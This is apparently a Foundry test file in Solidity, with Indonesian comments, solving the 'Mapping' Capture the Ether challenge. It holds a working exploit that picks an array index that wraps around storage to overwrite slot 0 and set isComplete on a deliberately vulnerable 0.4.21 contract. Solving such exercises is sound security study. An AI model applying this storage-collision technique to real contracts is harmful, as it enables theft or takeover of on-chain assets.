// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// #9 Mapping — kontrak 0.4.21 asli (MappingChallenge.sol):
// `bool public isComplete` di slot 0, `uint256[] map` di slot 1,
// data array di keccak256(1). set(key, value) menulis map[key] ke
// slot keccak256(1) + key. Pilih key = 2^256 - keccak256(1) sehingga
// tulisan mendarat di slot 0 -> isComplete = true. (map.length =
// key + 1 hanya menulis slot 1, tidak menghalangi.)
contract MappingSolve is Test {
    address challenge;

    function setUp() public {
        challenge = deployCode("MappingChallenge.sol:MappingChallenge");
    }

    function testInit() public view {
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertFalse(abi.decode(ret, (bool)));
    }

    function testSolve() public {
        uint256 key = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        (bool ok, ) = challenge.call(abi.encodeWithSignature("set(uint256,uint256)", key, 1));
        assertTrue(ok);
        (bool ok2, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok2);
        assertTrue(abi.decode(ret, (bool)));
    }
}
